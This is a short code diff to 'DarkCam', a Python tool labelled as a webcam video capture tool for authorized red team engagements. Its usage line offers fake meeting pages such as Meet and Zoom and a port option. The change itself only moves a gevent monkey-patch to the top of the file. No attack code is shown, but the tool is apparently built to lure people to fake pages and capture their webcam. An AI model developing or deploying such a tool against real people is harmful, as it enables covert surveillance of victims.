@@ -4,6 +4,10 @@ DarkCam — Webcam Video Capture Tool for Authorized Red Team Engagements
 Usage: python3 darkcam.py [--page meet|zoom|...] [--all] [--port 8080]
 """
 
+# gevent monkey-patch must happen before ANY other imports
+from gevent import monkey
+monkey.patch_all()
+
 import os
 import sys
 import time
@@ -262,7 +266,6 @@ def start_tunnel(port):
 
 def start_flask(page, port):
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    from gevent import monkey; monkey.patch_all()
     from flask import Flask, render_template, request, jsonify
     from flask_socketio import SocketIO, emit, join_room
     import json, datetime
